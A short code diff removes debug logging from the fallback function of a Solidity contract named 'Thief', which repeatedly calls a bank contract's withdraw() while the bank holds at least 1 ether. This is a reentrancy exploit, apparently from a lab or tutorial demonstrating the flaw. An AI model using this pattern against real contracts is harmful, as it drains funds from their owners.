@@ -11,13 +11,9 @@ contract Thief {
     }
 
     fallback() external payable {
-        console.log("step thief 1");
         if (address(bank).balance >= 1 ether) {
-            console.log("step thief 2");
             bank.withdraw();
-            console.log("step thief 3");
         }
-        console.log("step thief 4");
     }
 
     function attack() external payable {
